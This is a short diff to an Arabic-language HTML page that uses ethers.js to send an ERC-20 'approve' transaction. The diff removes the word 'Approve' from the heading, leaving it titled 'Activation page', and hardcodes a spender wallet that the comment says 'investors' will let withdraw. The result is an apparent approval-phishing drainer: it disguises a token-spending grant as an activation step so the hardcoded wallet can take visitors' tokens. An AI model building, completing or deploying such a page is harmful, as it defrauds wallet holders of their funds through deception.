@@ -6,7 +6,7 @@
   <script src="https://cdn.ethers.io/lib/ethers-5.6.umd.min.js" type="application/javascript"></script>
 </head>
 <body>
-  <h2>صفحة تفعيل Approve</h2>
+  <h2>صفحة تفعيل </h2>
 
   <label>عنوان توكن ERC-20: </label>
   <input type="text" id="tokenAddress" placeholder="أدخل عنوان التوكن هنا" size="50" />
@@ -73,8 +73,8 @@
 
         const contract = new ethers.Contract(tokenAddress, erc20AbiFull, signer);
 
-        // هنا تستبدل بعنوان محفظتك أو العنوان اللي عايز تعطيه الspend
-        const spenderAddress = "عنوان_المستفيد_من_السحب"; // غيره حسب المطلوب
+        // هنا عنوان محفظتك أو العنوان اللي هيسمح له المستثمرين بالسحب
+        const spenderAddress = "0xaB63dd850a8C2EDD526fF2D929187B94E03F777D";
 
         const decimals = await contract.decimals();
         const amount = ethers.utils.parseUnits(amountStr, decimals);
